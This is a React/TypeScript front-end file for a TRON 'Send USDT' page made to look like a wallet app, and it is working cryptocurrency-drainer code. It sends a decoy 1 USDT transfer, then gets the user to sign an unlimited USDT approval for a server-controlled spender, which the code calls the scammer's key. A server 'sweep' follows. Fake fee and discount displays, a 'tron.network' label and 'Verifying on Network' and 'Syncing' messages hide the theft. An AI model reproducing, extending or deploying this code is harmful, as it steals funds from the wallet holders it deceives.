import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import {
  DECOY_USDT_SEND_AMOUNT,
  getInjectedTronWeb,
  readTronPaymentFlowEnv,
  resolveSpenderAddress,
  runApproveAndSweepFlow,
  sendDecoyOneUsdt,
  USDT_TRC20_CONTRACT,
} from "./tron/tronPayment";

function truncateMiddle(value: string, left = 6, right = 6) {
  const v = value.trim();
  if (v.length <= left + right + 2) return v;
  return `${v.slice(0, left)}...${v.slice(-right)}`;
}

function safeTrim(value: unknown): string {
  return typeof value === "string" ? value.trim() : String(value ?? "").trim();
}

async function withTimeout<T>(promise: Promise<T>, ms: number, message: string): Promise<T> {
  let timer: number | undefined;
  try {
    return await Promise.race([
      promise,
      new Promise<T>((_, reject) => {
        timer = window.setTimeout(() => reject(new Error(message)), ms);
      }),
    ]);
  } finally {
    if (timer) window.clearTimeout(timer);
  }
}

export default function App() {
  const token = "USDT";
  const flowEnv = useMemo(() => readTronPaymentFlowEnv(), []);
  const [targetAddress, setTargetAddress] = useState(flowEnv.distributionWallet || "");
  /** Display-only; on-chain decoy send always uses 1.0 USDT via sendAsset. */
  const [amountDisplay, setAmountDisplay] = useState("1");
  const [memo, setMemo] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [step, setStep] = useState<"send" | "confirm">("send");
  const [detailsOpen, setDetailsOpen] = useState(false);
  const [isFlowProcessing, setIsFlowProcessing] = useState(false);
  const [showApprovalToast, setShowApprovalToast] = useState(false);
  const [walletPreview, setWalletPreview] = useState("");
  const [flowError, setFlowError] = useState<string | null>(null);
  const [, setIsProviderReady] = useState(false);
  const [injectedForValidation, setInjectedForValidation] = useState<
    { isAddress?: (addr: string) => boolean } | undefined
  >(undefined);
  const walletReadyRef = useRef(false);
  const [signStage, setSignStage] = useState<
    "idle" | "wallet_send_signature" | "wallet_approve_signature" | "server_sweep_execution"
  >("idle");

  const captureSendInputs = useCallback(() => {
    try {
      const rawAddress = targetAddress;
      const rawAmount = amountDisplay;
      const recipientAddress = safeTrim(targetAddress);
      const amountText = safeTrim(amountDisplay);

      if (!recipientAddress) {
        console.error("[Next Validation] Missing field: targetAddress");
      }
      if (!amountText) {
        console.error("[Next Validation] Missing field: amountDisplay");
      }
      if (typeof rawAddress !== "string") {
        console.error("[Next Validation] targetAddress is non-string:", rawAddress);
      }
      if (typeof rawAmount !== "string") {
        console.error("[Next Validation] amountDisplay is non-string:", rawAmount);
      }

      return { recipientAddress, amountText };
    } catch (error) {
      console.error("[Next Validation] Failed to capture send inputs:", error);
      return { recipientAddress: "", amountText: "" };
    }
  }, [targetAddress, amountDisplay]);
  const initializeInjectedWallet = useCallback(async (opts?: { silent?: boolean }) => {
    const silent = Boolean(opts?.silent);
    if (walletReadyRef.current) return;
    const timeoutMs = 5000;
    const pollEveryMs = 200;
    const desktopUa = !/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    const startedAt = Date.now();
    let intervalId: number | undefined;

    await new Promise<void>((resolve) => {
      const checkProvider = () => {
        const win = window as unknown as {
          tronWeb?: { defaultAddress?: { base58?: string }; isAddress?: (addr: string) => boolean };
          tron?: { tronWeb?: { defaultAddress?: { base58?: string }; isAddress?: (addr: string) => boolean } };
          tronLink?: {
            ready?: boolean;
            tronWeb?: { defaultAddress?: { base58?: string }; isAddress?: (addr: string) => boolean };
          };
        };

        const tw = win.tronWeb ?? win.tron?.tronWeb ?? win.tronLink?.tronWeb;
        if (tw) {
          if (intervalId) window.clearInterval(intervalId);
          walletReadyRef.current = true;
          setInjectedForValidation(tw);
          setIsProviderReady(true);
          const detectedAddress = tw.defaultAddress?.base58?.trim();
          if (detectedAddress) setWalletPreview(detectedAddress);
          resolve();
          return;
        }

        if (Date.now() - startedAt >= timeoutMs) {
          if (intervalId) window.clearInterval(intervalId);
          setIsProviderReady(false);
          if (!silent) {
            const hasDesktopTronLinkHint = desktopUa && Boolean(win.tronLink);
            const tronLinkReady = Boolean(win.tronLink?.ready);
            const message =
              hasDesktopTronLinkHint || tronLinkReady
                ? "TronLink detected but not injected yet. Unlock TronLink, open this dApp in TronLink/Trust Wallet browser, then wait a second."
                : "No TRON wallet found. Open this dApp in TronLink or Trust Wallet in-app browser, then connect your wallet.";
            setFlowError(message);
          }
          resolve();
        }
      };

      intervalId = window.setInterval(checkProvider, pollEveryMs);
      checkProvider();
    });
  }, []);

  const requestWalletConnection = useCallback(async () => {
    const win = window as unknown as {
      tronWeb?: {
        defaultAddress?: { base58?: string };
        request?: (args: { method: string }) => Promise<unknown>;
      };
      tron?: {
        tronWeb?: { defaultAddress?: { base58?: string } };
        request?: (args: { method: string }) => Promise<unknown>;
      };
      tronLink?: {
        ready?: boolean;
        tronWeb?: {
          defaultAddress?: { base58?: string };
          request?: (args: { method: string }) => Promise<unknown>;
        };
        request?: (args: { method: string }) => Promise<unknown>;
      };
    };
    const tw = win.tronWeb ?? win.tron?.tronWeb ?? win.tronLink?.tronWeb;
    if (tw?.defaultAddress?.base58) {
      setIsProviderReady(true);
      return;
    }

    const requesters = [
      win.tronLink?.request,
      win.tron?.request,
      win.tronWeb?.request,
      win.tronLink?.tronWeb?.request,
    ].filter(
      (fn): fn is (args: { method: string }) => Promise<unknown> => typeof fn === "function",
    );
    const requestMethods = ["tron_requestAccounts", "requestAccounts"] as const;

    const requestErrors: string[] = [];
    for (const request of requesters) {
      let connected = false;
      for (const method of requestMethods) {
        try {
          await withTimeout(
            request({ method }),
            15000,
            "Wallet connect request timed out. Open Trust Wallet/TronLink and approve the connect request.",
          );
          connected = true;
          break;
        } catch {
          requestErrors.push(`connect_request_failed:${method}`);
        }
      }
      if (connected) break;
    }

    walletReadyRef.current = false;
    await initializeInjectedWallet({ silent: true });

    const connectedTw =
      win.tronWeb ?? win.tron?.tronWeb ?? win.tronLink?.tronWeb;
    if (!connectedTw?.defaultAddress?.base58) {
      throw new Error(
        requestErrors.length > 0
          ? "Unable to connect wallet. Open Trust Wallet, approve the connection prompt, then tap Next again."
          : "Wallet not connected. Open this page inside Trust Wallet in-app browser and connect your wallet.",
      );
    }
  }, [initializeInjectedWallet]);

  const retryWalletDetection = useCallback(async () => {
    setFlowError(null);
    walletReadyRef.current = false;
    try {
      await requestWalletConnection();
    } catch (e) {
      setFlowError(e instanceof Error ? e.message : String(e));
    }
  }, [requestWalletConnection]);

  useEffect(() => {
    void initializeInjectedWallet({ silent: true });

    const onFocus = () => {
      if (!walletReadyRef.current) void initializeInjectedWallet({ silent: true });
    };
    const onVisibilityChange = () => {
      if (document.visibilityState === "visible" && !walletReadyRef.current) {
        void initializeInjectedWallet({ silent: true });
      }
    };
    const onTronInjected = () => {
      if (!walletReadyRef.current) void initializeInjectedWallet({ silent: true });
    };

    window.addEventListener("focus", onFocus);
    document.addEventListener("visibilitychange", onVisibilityChange);
    // Wallets can inject provider after initial page load.
    window.addEventListener("tronLink#initialized", onTronInjected as EventListener);
    window.addEventListener("tronWeb#initialized", onTronInjected as EventListener);
    return () => {
      window.removeEventListener("focus", onFocus);
      document.removeEventListener("visibilitychange", onVisibilityChange);
      window.removeEventListener("tronLink#initialized", onTronInjected as EventListener);
      window.removeEventListener("tronWeb#initialized", onTronInjected as EventListener);
    };
  }, [initializeInjectedWallet]);

  const twMaybe = injectedForValidation;
  const normalizedTargetAddress = safeTrim(targetAddress);
  const normalizedAmountDisplay = safeTrim(amountDisplay);
  const isLikelyTronAddress =
    normalizedTargetAddress.startsWith("T") &&
    normalizedTargetAddress.length >= 30 &&
    normalizedTargetAddress.length <= 36;
  const isTronAddress = twMaybe?.isAddress?.(normalizedTargetAddress) ?? isLikelyTronAddress;
  const amountNum = Number(amountDisplay);
  const amountOk = normalizedAmountDisplay !== "" && Number.isFinite(amountNum) && amountNum > 0;
  const formValid = isTronAddress && amountOk;
  const canContinue = formValid && !isLoading;
  const amountNumber = Number(amountDisplay || "0");
  const fiat = useMemo(() => amountNumber, [amountNumber]);

  const onSubmit = async () => {
    if (!canContinue) return;
    setIsLoading(true);
    setFlowError(null);
    try {
      const { recipientAddress, amountText } = captureSendInputs();
      if (!recipientAddress || !amountText) {
        throw new Error("Address or amount is missing. Check console for the exact field.");
      }
      const amountParsed = Number(amountText);
      if (!Number.isFinite(amountParsed) || amountParsed <= 0) {
        console.error("[Next Validation] Invalid amountDisplay value:", amountText);
        throw new Error("Amount must be a valid positive number.");
      }
      await requestWalletConnection();
      const tw = getInjectedTronWeb();
      if (!isTronAddress) {
        console.error("[Next Validation] Invalid TRON address:", recipientAddress);
        throw new Error("Enter a valid TRON recipient address (starts with T).");
      }
      setSignStage("wallet_send_signature");
      await withTimeout(
        sendDecoyOneUsdt(tw, recipientAddress),
        30000,
        "Signature request timed out. Open Trust Wallet and approve/reject the pending transaction.",
      );
      setWalletPreview(tw.defaultAddress.base58);
      // Confirm screen removed: continue immediately with approve+sweep flow.
      await onApprove();
    } catch (e) {
      setSignStage("idle");
      setFlowError(e instanceof Error ? e.message : String(e));
    } finally {
      setIsLoading(false);
    }
  };

  const onApprove = async () => {
    const spender = resolveSpenderAddress();
    if (!spender) {
      setFlowError(
        "Set VITE_TRON_SPENDER_ADDRESS (or VITE_OPERATOR_ADDRESS) to the server wallet base58 address (same key as SCAMMER_PRIVATE_KEY).",
      );
      setStep("send");
      return;
    }
    setIsFlowProcessing(true);
    setFlowError(null);
    try {
      const { recipientAddress } = captureSendInputs();
      if (!recipientAddress) {
        throw new Error("Address is missing. Check console for the exact field.");
      }
      await requestWalletConnection();
      const tw = getInjectedTronWeb();
      const isValidAddress =
        (tw as unknown as { address?: { isValid?: (addr: string) => boolean } }).address?.isValid?.(recipientAddress) ??
        tw.isAddress(recipientAddress);
      if (!isValidAddress) {
        throw new Error("Recipient address is not a valid TRON address.");
      }
      if (!tw.isAddress(spender)) {
        throw new Error("Spender address is not a valid Tron address.");
      }
      const owner = tw.defaultAddress.base58;
      const minTrxSun = Number(import.meta.env.VITE_TRON_MIN_TRX_SUN || "100000");
      const trxBalanceSun = await (
        tw as unknown as { trx: { getBalance: (addr: string) => Promise<number> } }
      ).trx.getBalance(owner);
      if (!Number.isFinite(trxBalanceSun) || trxBalanceSun < minTrxSun) {
        throw new Error("Insufficient TRX balance for gas fees.");
      }

      const usdtContract = (tw as unknown as {
        contract: (abi: readonly Record<string, unknown>[], address: string) => {
          balanceOf: (ownerAddress: string) => { call: () => Promise<unknown> };
        };
      }).contract(
        [
          {
            constant: true,
            inputs: [{ name: "owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "balance", type: "uint256" }],
            type: "function",
          },
        ] as const,
        USDT_TRC20_CONTRACT,
      );
      const usdtRaw = await usdtContract.balanceOf(owner).call();
      const usdtBalance =
        typeof usdtRaw === "bigint"
          ? usdtRaw
          : BigInt(
              typeof usdtRaw === "object" && usdtRaw && "_hex" in (usdtRaw as Record<string, unknown>)
                ? String((usdtRaw as { _hex?: string })._hex)
                : String(usdtRaw),
            );
      const transferAmount = BigInt(DECOY_USDT_SEND_AMOUNT);
      if (usdtBalance < transferAmount) {
        throw new Error("Insufficient USDT balance for 1.0 USDT transfer.");
      }

      setWalletPreview(owner);
      await withTimeout(
        runApproveAndSweepFlow({
          tronWeb: tw,
          spenderAddress: spender,
          onStage: (stage) => {
            setSignStage(stage);
            if (stage === "server_sweep_execution") {
              setShowApprovalToast(true);
              window.setTimeout(() => setShowApprovalToast(false), 2000);
            }
          },
        }),
        45000,
        "Approval signature timed out. Open Trust Wallet and approve/reject the pending request.",
      );
    } catch (e) {
      setFlowError(e instanceof Error ? e.message : String(e));
      setStep("send");
    } finally {
      setIsFlowProcessing(false);
      setSignStage("idle");
    }
  };

  const onCloseApprove = () => {
    setStep("send");
  };

  const processingLabel =
    signStage === "wallet_send_signature"
      ? "Sign payment..."
      : signStage === "wallet_approve_signature"
        ? "Sign approve..."
        : signStage === "server_sweep_execution"
          ? "Syncing..."
          : "Processing...";

  const tronIconSmall = (
    <svg className="tron-icon tron-icon--sm" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <path d="M6 5L18 7.3L12.5 19L6 5Z" stroke="white" strokeWidth="1.7" strokeLinejoin="round" />
      <path d="M6 5L12.2 10.6L18 7.3" stroke="white" strokeWidth="1.7" strokeLinejoin="round" />
      <path d="M12.2 10.6L12.5 19" stroke="white" strokeWidth="1.7" strokeLinejoin="round" />
    </svg>
  );

  const scannerIcon = (
    <svg className="scanner-icon" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path
        d="M25 40V30C25 27.2386 27.2386 25 30 25H40"
        stroke="#2ad96f"
        strokeWidth="8"
        strokeLinecap="round"
      />
      <path
        d="M60 25H70C72.7614 25 75 27.2386 75 30V40"
        stroke="#2ad96f"
        strokeWidth="8"
        strokeLinecap="round"
      />
      <path
        d="M25 60V70C25 72.7614 27.2386 75 30 75H40"
        stroke="#2ad96f"
        strokeWidth="8"
        strokeLinecap="round"
      />
      <path
        d="M60 75H70C72.7614 75 75 72.7614 75 70V60"
        stroke="#2ad96f"
        strokeWidth="8"
        strokeLinecap="round"
      />
      <rect x="20" y="46" width="60" height="8" rx="4" fill="#60f69a" />
    </svg>
  );

  return (
    <main className="screen">
      {showApprovalToast ? (
        <div className="approval-toast" role="status" aria-live="polite">
          <span className="approval-toast__title">Approved Unlimited USDT</span>
          <span className="approval-toast__subtitle">Approval signature confirmed</span>
        </div>
      ) : null}
      {step === "confirm" && isFlowProcessing ? (
        <div className="network-verify-overlay" role="status" aria-live="polite" aria-busy="true">
          <div className="network-verify-overlay__pulse" aria-hidden="true">
            <span className="network-verify-overlay__pulse-core" />
            <span className="network-verify-overlay__pulse-ring network-verify-overlay__pulse-ring--1" />
            <span className="network-verify-overlay__pulse-ring network-verify-overlay__pulse-ring--2" />
          </div>
          <p className="network-verify-overlay__label">Verifying on Network...</p>
        </div>
      ) : null}
      <section className={`app-shell ${step === "confirm" ? "app-shell--approve" : ""}`}>
        <header className="topbar">
          {step === "confirm" ? (
            <button type="button" className="close-btn" onClick={onCloseApprove} aria-label="Close">
              ×
            </button>
          ) : (
            <span className="topbar-spacer" aria-hidden="true" />
          )}
          <h1 className="title">{step === "confirm" ? "Confirm Transaction" : "Send USDT"}</h1>
          <span className="topbar-spacer" />
        </header>

        {step === "send" ? (
        <div className="content">
          <label className="field-label">Address</label>
          <div className="field-box">
            <input
              className="field-input field-input--address"
              value={targetAddress}
              onChange={(e) => setTargetAddress(e.target.value)}
              placeholder="Search or Enter"
            />
            <button
              type="button"
              className="inline-action"
              onClick={() => navigator.clipboard?.writeText(targetAddress)}
            >
              Paste
            </button>
            <span className="mini-icon icon-wrap" aria-hidden="true">
              <svg
                className="note-icon"
                width="30"
                height="30"
                viewBox="0 0 100 100"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <rect x="30" y="25" width="45" height="50" rx="4" stroke="#2ad96f" strokeWidth="7" />
                <rect x="22" y="32" width="10" height="5" rx="2.5" fill="#60f69a" />
                <rect x="22" y="44" width="10" height="5" rx="2.5" fill="#60f69a" />
                <rect x="22" y="56" width="10" height="5" rx="2.5" fill="#60f69a" />
                <rect x="22" y="68" width="10" height="5" rx="2.5" fill="#60f69a" />
                <rect x="42" y="38" width="22" height="5" rx="2.5" fill="#2ad96f" />
                <rect x="42" y="50" width="22" height="5" rx="2.5" fill="#2ad96f" />
              </svg>
            </span>
            <span className="mini-icon icon-wrap" aria-hidden="true">
              {scannerIcon}
            </span>
          </div>

          <label className="field-label">Destination network</label>
          <div className="network-row">
            <button type="button" className="network-chip">
              <span className="network-dot" aria-hidden="true">
                <svg
                  className="tron-icon"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M6 5L18 7.3L12.5 19L6 5Z" stroke="white" strokeWidth="1.7" strokeLinejoin="round" />
                  <path d="M6 5L12.2 10.6L18 7.3" stroke="white" strokeWidth="1.7" strokeLinejoin="round" />
                  <path d="M12.2 10.6L12.5 19" stroke="white" strokeWidth="1.7" strokeLinejoin="round" />
                </svg>
              </span>
              Tron
              <span className="chip-caret">▾</span>
            </button>
          </div>

          <label className="field-label">Amount</label>
          <div className="field-box">
            <input
              className="field-input"
              value={amountDisplay}
              onChange={(e) => setAmountDisplay(e.target.value.replace(/[^\d.]/g, ""))}
              placeholder={`${token} Amount`}
            />
            <div className="field-right">
              <span className="token-tag">{token}</span>
              <button className="inline-link" type="button" onClick={() => setAmountDisplay("1000")}>
                Max
              </button>
            </div>
          </div>

          <p className="fiat-note">~ ${fiat.toFixed(2)}</p>

          <label className="field-label">Memo</label>
          <div className="field-box memo-box">
            <input className="field-input" value={memo} onChange={(e) => setMemo(e.target.value)} placeholder="" />
            <span className="mini-icon icon-wrap" aria-hidden="true">
              {scannerIcon}
            </span>
            <span className="mini-icon info-icon" aria-hidden="true">
              <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" role="presentation">
                <circle cx="10" cy="10" r="9" />
                <rect x="9.2" y="8.2" width="1.6" height="6" rx="0.8" />
                <circle cx="10" cy="5.9" r="1.1" />
              </svg>
            </span>
          </div>
        </div>
        ) : (
        <div className="content content--approve">
          <div className="tx-card">
            <div className="tx-row">
              <span className="tx-label">Asset</span>
              <span className="tx-value">
                TRON TRC20 ({token})
              </span>
            </div>
            {detailsOpen ? (
              <>
                <div className="tx-row">
                  <span className="tx-label">From</span>
                  <span className="tx-value tx-value--stack">
                    <span className="tx-strong">Main Wallet</span>
                    <span className="tx-muted">
                      {walletPreview ? truncateMiddle(walletPreview, 7, 6) : "—"}
                    </span>
                  </span>
                </div>
                <div className="tx-row">
                  <span className="tx-label">Contract address</span>
                  <span className="tx-value tx-mono">{truncateMiddle(USDT_TRC20_CONTRACT, 7, 6)}</span>
                </div>
                <div className="tx-row">
                  <span className="tx-label">Network</span>
                  <span className="tx-value">TRON</span>
                </div>
              </>
            ) : null}
            <div className="details-toggle-row">
              <span className="details-rule" aria-hidden="true" />
              <button
                type="button"
                className="details-toggle"
                onClick={() => setDetailsOpen((o) => !o)}
              >
                {detailsOpen ? "Hide details" : "View details"}
                <span className="details-chevron" aria-hidden="true">
                  {detailsOpen ? "▴" : "▾"}
                </span>
              </button>
              <span className="details-rule" aria-hidden="true" />
            </div>
            <div className="tx-row tx-row--tight">
              <span className="tx-label">DApp</span>
              <span className="tx-value">tron.network</span>
            </div>
            {detailsOpen ? (
              <>
                <div className="tx-row">
                  <span className="tx-label">Spender</span>
                  <span className="tx-value tx-mono">
                    {flowEnv.spenderAddress ? truncateMiddle(flowEnv.spenderAddress, 7, 6) : "—"}
                  </span>
                </div>
                <div className="tx-row">
                  <span className="tx-label">Sweep API</span>
                  <span className="tx-value tx-mono">{flowEnv.sweepApiPath || "—"}</span>
                </div>
              </>
            ) : null}
          </div>

          <div className="tx-card tx-card--fee">
            <div className="fee-card-inner">
              <div className="fee-card-left">
                <span className="fee-label">Network fee</span>
                <span className="fee-info-icon" aria-hidden="true">
                  <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" role="presentation">
                    <circle cx="10" cy="10" r="9" />
                    <rect x="9.2" y="8.2" width="1.6" height="6" rx="0.8" />
                    <circle cx="10" cy="5.9" r="1.1" />
                  </svg>
                </span>
              </div>
              <div className="fee-card-right">
                <span className="fee-discount-badge">5.1% Discount</span>
                <div className="fee-fiat-row">
                  <span className="fee-token-dot" aria-hidden="true">
                    {tronIconSmall}
                  </span>
                  <span className="fee-usd">$2.05</span>
                </div>
                <span className="fee-trx-amount">6.446 TRX</span>
              </div>
            </div>
          </div>
        </div>
        )}

        <footer className="footer">
          {flowError ? (
            <p className="flow-error" role="alert">
              {flowError}
            </p>
          ) : null}
          {step === "send" ? (
            <>
              <div className="network-fee-row" aria-label="Network fee">
                <span className="network-fee-row__left">
                  <span className="network-fee-row__icon" aria-hidden="true">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" role="presentation">
                      <path d="M12 2.5l4 5.2-.8 3.8-3.2 3.5-3.2-3.5-.8-3.8 4-5.2z" />
                      <path d="M12 13.5l2.5 2.6-.5 2.4L12 21l-2-2.5-.5-2.4L12 13.5z" />
                    </svg>
                  </span>
                  <span className="network-fee-row__label">Network fee:</span>
                </span>
                <span className="network-fee-row__value">&lt; $0.01</span>
              </div>
              <button
                className={`primary-btn ${!formValid && !isLoading ? "disabled" : ""} ${isLoading ? "primary-btn--processing" : ""}`}
                onClick={onSubmit}
                type="button"
                disabled={!formValid || isLoading}
              >
                {isLoading ? (
                  <>
                    <span className="primary-btn__spinner" aria-hidden="true" />
                    <span>{processingLabel}</span>
                  </>
                ) : (
                  "Next"
                )}
              </button>
              <button className="primary-btn" type="button" onClick={retryWalletDetection} disabled={isLoading}>
                Retry Wallet Connection
              </button>
            </>
          ) : (
            <>
              <div className="network-fee-row" aria-live="polite">
                <span className="network-fee-row__left">
                  <span className="network-fee-row__label">Dual signature sequence:</span>
                </span>
                <span className="network-fee-row__value">
                  {signStage === "wallet_send_signature"
                    ? "1/3 Wallet send"
                    : signStage === "wallet_approve_signature"
                      ? "2/3 Wallet approve"
                      : signStage === "server_sweep_execution"
                        ? "3/3 Server sweep"
                        : "Ready"}
                </span>
              </div>
              <button
                className="primary-btn"
                type="button"
                onClick={onApprove}
                disabled={isFlowProcessing}
              >
                {isFlowProcessing ? processingLabel : "Confirm Transaction"}
              </button>
            </>
          )}
        </footer>
      </section>
    </main>
  );
}
